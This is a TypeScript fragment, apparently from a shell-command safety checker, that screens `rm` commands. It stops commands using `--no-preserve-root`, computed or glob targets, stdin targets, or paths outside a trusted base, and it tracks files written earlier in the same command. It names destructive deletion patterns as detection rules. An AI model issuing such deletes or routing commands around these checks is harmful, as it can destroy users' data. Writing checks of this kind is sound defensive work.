  const rmsAt = new Map<string, number[]>(); // path → rm segment indices
  const record = (m: Map<string, number[]>, p: string, i: number) => {
    const idxs = m.get(p);
    if (idxs) idxs.push(i);
    else m.set(p, [i]);
  };
  const noPreserveRoot = () => ({ reason: "rm with --no-preserve-root" as string | null, exempt: new Set<string>() });

  // First pass: collect self-written paths (ordered by segment) and rm targets.
  for (let i = 0; i < segments.length; i++) {
    const seg = segments[i];
    const words = operativeTokens(seg);
    if (isRmSegment(seg)) {
      if (words.includes("--no-preserve-root")) return noPreserveRoot();
      const args = words.slice(1).filter((t) => !t.startsWith("-"));
      if (args.length === 0) return { reason: "rm without explicit targets", exempt: new Set() };
      const recursive = words.slice(1).some(
        (t) => t === "--recursive" || (t.startsWith("-") && !t.startsWith("--") && t !== "-" && /[rR]/.test(t)),
      );
      for (const a of args) {
        // A pure tilde is deterministic (always $HOME) — not a hidden value
        // like a glob or variable. Expand it first, then apply the
        // explicitness bar to the concrete path: `rm ~/x.log` inside the
        // trusted base is judgeable like its absolute-path form. A QUOTED
        // tilde is a literal filename to the shell (no expansion) — it
        // stays on the floor (the tokenizer strips quotes, so the raw
        // segment is checked). Tilde+glob still floors (the glob survives
        // expansion). (2026-08-31)
        let target = cleanToken(a);
        const quotedTilde = target.startsWith("~") && (seg.includes(`'${target}`) || seg.includes(`"${target}`));
        if (!quotedTilde && (target === "~" || target.startsWith("~/"))) target = expandTilde(target);
        // D-c: a glob is no longer a stop by SYNTAX. Its shape and reach were
        // checked before this branch runs (analysis/delete-scale.ts): the count
        // ceiling outside the temp dirs already stopped the large case, so an
        // in-bar glob arrives here countable, and the judge sees the number.
        // What has no location at all stays on the floor — a value the shell
        // supplies, and a quoted tilde (the tokenizer stripped the quotes, so
        // whether this is $HOME/x or a file literally named `~x` is unknown).
        const glob = RM_GLOB_TARGET_RE.test(target);
        if (RM_COMPUTED_TARGET_RE.test(target) || quotedTilde) {
          return { reason: `delete target not static (${target.slice(0, 40)})`, exempt: new Set() };
        }
        if (target === "-") return { reason: "rm reading from stdin", exempt: new Set() };
        // For a glob the bar check runs on the operand's STATIC ROOT — the
        // deepest metachar-free dir, which is what the pattern can reach.
        const resolved = resolvePathReal(glob ? staticRootOf(target, cwd) : target, cwd);
        // A glob rooted at the cwd deletes its ENTRIES, not the directory
        // itself (the shell never expands `*` to `.`) — only an operand that
        // names the cwd is the self-delete case.
        if (resolved === cwd && !glob) return { reason: "rm target is the working directory itself", exempt: new Set() };
        if (recursive && !glob) {
          // An explicit recursive target that exists must be a dir or
          // self-written; a glob's entries are counted by the delete-scale
          // walk, which does not care whether each one is a dir.
          try {
            const st = fs.statSync(resolved);
            const selfWritten = writtenBefore.has(resolved);
            if (!st.isDirectory() && !st.isFile() && !selfWritten) {
              return { reason: `rm -r target is not a file or directory (${a.slice(0, 60)})`, exempt: new Set() };
            }
            if (!st.isDirectory() && !st.isFile() && selfWritten) {
              /* self-written: trust the earlier segment */
            }
          } catch {
            /* doesn't exist — nothing to delete */
          }
        }
        record(rmsAt, resolved, i);
        if (
          !isInsideBase(resolved) &&
          !writtenBefore.has(resolved) &&
          !isTmpScratchTarget(resolved, recursive)
        ) {
          return { reason: `rm target outside base (${a.slice(0, 60)})`, exempt: new Set() };
        }
      }
    } else {
      // Self-written paths from this earlier segment. Quote-aware token scan:
      // a `>` inside quotes (echo "a > b") is data, not a redirect — the old
      // raw-text regex fabricated a self-write for it.
      const tokens = tokenizeSegment(seg);
      for (let ti = 0; ti < tokens.length; ti++) {
        const tok = tokens[ti];
        const m = tok.match(OUT_REDIRECT_RE) ?? tok.match(IN_REDIRECT_RE);
        let target: string | null = null;
        if (m) target = m[2] !== "" ? m[2] : (tokens[ti + 1] ?? null);
        else if (BARE_REDIRECT_RE.test(tok)) target = tokens[ti + 1] ?? null;
        if (target === null || target.startsWith("&")) continue; // fd duplication (2>&1, > &1)
        if (RM_NOT_CONCRETE_RE.test(target)) continue; // glob/var/computed — never a concrete self-write
        const resolved = resolvePathReal(expandTilde(target), cwd);
        if (isDevNullish(resolved)) continue;
        writtenBefore.add(resolved);
        record(writesAt, resolved, i);
      }
      // Self-write commands per pipeline stage — `a | tee f` hides tee
      // behind the segment's first word. splitOnPipe is quote-aware.
      for (const stage of splitOnPipe(seg)) {
        const sw = operativeTokens(stage);
        const scmd = sw[0]?.split("/").pop()?.toLowerCase() ?? "";
        if (!SELF_WRITE_CMDS.has(scmd)) continue;
        for (const t of sw.slice(1)) {
          const target = cleanToken(t);
          if (t.startsWith("-") || /^[\d<>]/.test(t) || RM_NOT_CONCRETE_RE.test(target)) continue;
          const resolved = resolvePathReal(expandTilde(target), cwd);
          if (isDevNullish(resolved)) continue;
          writtenBefore.add(resolved);
          record(writesAt, resolved, i);
        }
      }
    }
  }

  // Every self-written path must be in-base or cleaned up by a LATER rm in
  // this command (a write after its rm survives — the outside write stands).
  for (const [w, idxs] of writesAt) {
    // EVERY write instance must be followed by an rm — `> f; rm f; > f`
    // leaves the last write standing outside the base.
    const cleaned = idxs.every((i) => (rmsAt.get(w) ?? []).some((j) => j > i));
    if (!isInsideBase(w) && !cleaned) {
      return { reason: `write-redirect outside base, not cleaned by this command (${w.slice(0, 60)})`, exempt: new Set() };
    }
  }

  // Self-written targets (written in an EARLIER segment) are exempt from
  // the floor's outside-base stop — the create-then-delete set is judgeable
  // (D8 /tmp-scratch targets are inside the manual bar via config and never
  // reach the outside set).
  const exempt = new Set<string>();
  for (const [t, idxs] of rmsAt) {
    if ((writesAt.get(t) ?? []).some((i) => idxs.some((j) => i < j))) exempt.add(t);
  }
  return { reason: null, exempt };
}
